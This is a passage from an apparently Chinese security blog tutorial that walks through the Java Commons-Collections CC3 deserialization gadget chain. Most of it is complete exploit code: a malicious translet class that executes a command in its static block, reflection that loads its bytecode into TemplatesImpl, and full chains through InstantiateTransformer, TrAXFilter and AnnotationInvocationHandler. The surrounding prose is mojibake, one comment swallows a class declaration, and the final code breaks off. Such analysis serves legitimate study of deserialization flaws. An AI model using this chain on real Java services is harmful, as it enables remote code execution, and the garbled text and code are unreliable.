<li>418 è¡Œï¼Œåˆ¤æ–­åœ¨ <code>defineClass()</code> æ–¹æ³•ä¸­ä¼ è¿›å»çš„å‚æ•° b æ•°ç»„çš„å­—èŠ‚ç æ˜¯å¦ç»§æ‰¿äº† <code>ABSTRACT_TRANSLET</code> è¿™ä¸ªçˆ¶ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»æ¶æ„ç±»ä¸­ç»§æ‰¿ <code>ABSTRACT_TRANSLET</code> è¿™ä¸ªçˆ¶ç±»ã€‚</li>
</ul>
<p>æ³¨æ„è¿™æ˜¯ä¸ªæŠ½è±¡ç±»ï¼Œé‡Œé¢çš„æŠ½è±¡æ–¹æ³•éƒ½å¾—å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å†æ‰§è¡Œå°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†ï¼š</p>
<p><img src="/img/cc308.png" srcset="/img/loading.gif" lazyload alt="cc308"></p>
<p>åé¢å°±å¾ˆå¥½ç†è§£äº†ï¼šç°åœ¨è°ƒ<code>newTransformer()</code>è¿™æ¡è·¯èµ°å¾—é€šï¼Œè€Œä¸”<code>newTransformer()</code>è¿˜æ˜¯ä¸ª<code>public</code>æ–¹æ³•ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>CC1</code>é‚£è¾¹çš„<code>chainedTransformer</code>æ›¿æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1TemplatesEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">// templates.newTransformer();  </span><br>  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> chainedTransformer.transform(<span class="hljs-number">1</span>);   <br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>transform</code>é‡Œé¢çš„å‚æ•°æ— æ‰€è°“ï¼Œå› ä¸ºå­˜åœ¨<code>new ConstantTransformer(templates)</code>ã€‚è¯´ç™½äº†å°±æ˜¯<code>templates.newTransformer()</code>ï¼Œæ¢åˆ«çš„æ–¹æ³•ç½¢äº†ã€‚</p>
<p>è¿™æ¡è·¯æ—¢ç„¶èƒ½èµ°é€šï¼Œå¯ä»¥å°è¯•æŠŠ<code>CC1</code>å‰©ä¸‹çš„éƒ¨åˆ†éƒ½æ”¾è¿›å»ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1TemplatesEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">// templates.newTransformer();  </span><br>  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> <span class="hljs-comment">//   chainedTransformer.transform(1);  </span><br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>ysoser</code>ç‰ˆCC3:</p>
<p>ä¸Šé¢åˆ†æäº†ï¼Œåªè¦å®ç°è°ƒç”¨<code>templates.newTransformer()</code>å°±èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥æ‰¾éƒ½å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•(è¿™é‡Œæˆ‘å°±ç›´æ¥å»çœ‹<code>TrAXFilter</code>äº†ï¼Œå…·ä½“åŸå› å‚è€ƒ<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/#1-CC3-%E9%93%BE%E5%88%86%E6%9E%90">å‚è€ƒæ–‡ç« </a>)ï¼š</p>
<p><img src="/img/TrAXFilterCode.png" srcset="/img/loading.gif" lazyload alt="TrAXFilterCode"></p>
<p>æ³¨æ„æ„é€ å‡½æ•°ä¸­çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">_templates = templates;<br>_transformer = (TransformerImpl) templates.newTransformer();<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªè¦è°ƒäº†è¿™ä¸ªæ„é€ å‡½æ•°å°±èƒ½è¾¾åˆ°ç›®æ ‡</p>
<p>æœ‰æ²¡æœ‰å“ªä¸ªåœ°æ–¹è°ƒäº†è¿™ä¸ªæ„é€ å‡½æ•°ï¼Ÿ</p>
<p><code>InstantiateTransformer</code>ä¸‹å­˜åœ¨ï¼š</p>
<p><img src="/img/InstantiateTransformer.png" srcset="/img/loading.gif" lazyload alt="InstantiateTransformer"></p>
<p>å¯ä»¥é€šè¿‡<code>transform</code>è°ƒç”¨æŒ‡å®šæ„é€ å™¨å¹¶æ”¾å…¥æŒ‡å®šå‚æ•°ï¼Œçœ‹ä¸‹è¿™ä¸ªå‚æ•°æ€ä¹ˆå®šä¹‰çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    iParamTypes = paramTypes;<br>    iArgs = args;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥ç°åœ¨çš„é€»è¾‘ï¼š</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">éœ€è¦å®ç°ï¼štemplates.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>	TrAXFilterçš„æ„é€ å‡½æ•°è°ƒç”¨äº†templates.newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span><br>		InstantiateTransformer.transformå¯ä»¥è¿›è¡Œæ„é€ æ–¹æ³•è°ƒç”¨<br>(æ‰€ä»¥è¿™é‡Œåˆå›åˆ°äº†transformæ–¹æ³•çš„è°ƒç”¨)<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼ å…¥ <code>new Class[]&#123;Templates.class&#125;</code> ä¸ <code>new Object[]&#123;templates&#125;</code> å³å¯ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬æŠŠå‰é¢çš„<code>templates.newTransformer()</code>æ›¿æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> instantiateTransformer.transform(TrAXFilter.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/cc307.png" srcset="/img/loading.gif" lazyload alt="cc307"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆå›åˆ°äº†<code>transform</code>æ–¹æ³•çš„è°ƒç”¨ã€‚ã€‚ç›´æ¥æŠŠä»–å’Œ<code>CC1</code>çš„æ‹¼ä¸€ä¸‹ï¼š</p>
<p>å…¶å®å°±æ˜¯æŠŠ<code> instantiateTransformer.transform(TrAXFilter.class);</code>æ¢æ‰</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// CC3 é“¾æœ€ç»ˆ EXPpublic class CC3FinalEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception  <br>    &#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br>  <br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,   <span class="hljs-comment">//æ³¨æ„è¿™é‡Œ</span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> instantiateTransformer  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  <br>  <br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  